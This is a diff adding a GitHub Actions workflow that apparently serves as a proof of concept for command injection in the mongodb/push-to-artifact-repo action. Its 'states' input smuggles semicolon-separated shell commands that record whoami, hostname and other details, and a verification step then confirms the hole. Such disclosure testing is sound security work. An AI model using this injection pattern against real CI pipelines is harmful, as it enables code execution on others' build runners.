@@ -1,0 +1,50 @@
+name: POC - Command Injection via states input
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
+jobs:
+  exploit-states:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: POC - Command Injection via states input
+        uses: mongodb/push-to-artifact-repo@main
+        continue-on-error: true
+        with:
+          # Command injection via unquoted $state in entrypoint.sh:29-30
+          # The states value is iterated unquoted: for state in $INPUT_STATES
+          # Then used unquoted: --state $state --branch $state
+          # Shell interprets ; as command separator, executing our injected commands
+          email: "poc-test@example.com"
+          name: "POC Tester"
+          states: "safe; echo '🚨 COMMAND INJECTION via states input 🚨' > /tmp/states-injection-poc.txt && echo 'Whoami:' $(whoami) >> /tmp/states-injection-poc.txt && echo 'Hostname:' $(hostname) >> /tmp/states-injection-poc.txt && echo 'PWD:' $(pwd) >> /tmp/states-injection-poc.txt && echo 'Date:' $(date) >> /tmp/states-injection-poc.txt; echo injected"
+          source: "./source"
+          # Using a dummy repo URL - the action will fail but injection executes first
+          toRepo: "https://github.com/nonexistent/repo.git"
+
+      - name: Verify Injection - states input
+        shell: bash
+        run: |
+          echo "============================================"
+          echo "VERIFICATION: Command Injection via 'states' input"
+          echo "============================================"
+          if [ -f /tmp/states-injection-poc.txt ]; then
+            echo "✅ VULNERABILITY CONFIRMED!"
+            echo ""
+            echo "The following commands were executed via injection:"
+            echo "---"
+            cat /tmp/states-injection-poc.txt
+            echo "---"
+            echo ""
+            echo "📍 Vulnerable code location: entrypoint.sh:29-30"
+            echo "   --state \$state   (unquoted variable)"
+            echo "   --branch \$state  (unquoted variable)"
+          else
+            echo "❌ Injection file not found - check action logs"
+          fi
